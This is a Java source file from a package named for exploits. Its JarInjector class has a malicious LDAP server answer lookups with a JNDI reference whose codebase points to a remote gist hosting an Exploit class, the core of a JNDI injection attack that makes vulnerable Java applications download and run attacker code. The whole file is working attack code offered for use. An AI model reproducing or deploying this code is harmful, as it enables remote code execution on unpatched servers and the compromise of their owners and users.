package me.func.exploit.behavior;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import me.func.payload.Exploit;

public class JarInjector implements Injector {

	private static final String EXPLOIT_URL =
			"https://gist.githubusercontent.com/funcid/8a8ee47dd30bd89a9159924420fc6a9a/raw/c4d51bbd1a876229887cc8b607f016bb0ae79c9d/Exploit.java";

	@Override
	public void send(InMemoryInterceptedSearchResult result, Entry entry) {

		entry.addAttribute("javaClassName", Exploit.class.getName());
		entry.addAttribute("javaCodeBase", EXPLOIT_URL);
		entry.addAttribute("objectClass", "javaNamingReference");
		entry.addAttribute("javaFactory", "anything");

	}
}
